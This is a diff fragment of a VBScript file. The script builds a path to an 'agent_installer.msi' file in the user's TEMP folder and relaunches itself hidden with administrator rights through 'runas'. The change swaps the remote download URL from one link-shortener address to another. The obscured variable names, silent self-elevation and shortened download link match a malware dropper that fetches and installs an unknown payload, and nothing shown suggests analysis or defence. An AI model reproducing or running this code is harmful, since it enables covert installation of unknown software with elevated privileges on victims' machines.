@@ -3,7 +3,7 @@ Dim x1, x2, x3, x4, x5, x6, x7, x8, x9
 x1 = "WScript.Shell"
 x2 = CreateObject(x1).ExpandEnvironmentStrings("%TEMP%")
 x3 = x2 & "\agent_installer.msi"
-x4 = "https://share.google/dDynM21vQuy0Qvc4Z"
+x4 = "https://search.app/gnR5H"
 
 If Not WScript.Arguments.Named.Exists("elevated") Then
     CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 0
